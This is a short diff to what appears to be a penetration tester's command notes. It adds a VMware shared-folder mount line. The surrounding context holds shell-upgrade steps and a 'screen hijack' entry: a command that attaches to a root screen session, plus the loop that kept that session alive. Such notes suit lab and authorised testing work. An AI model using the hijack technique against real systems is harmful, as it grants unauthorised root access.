@@ -37,6 +37,9 @@ CTRL + Z
 stty raw -echo
 fg
 
+SHARED FOLDER
+sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/ -o allow_other
+
 SCREEN HI-JACK ROOT SUID SESSION
 screen -x root/root
 The said screen was ran with: "/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done"
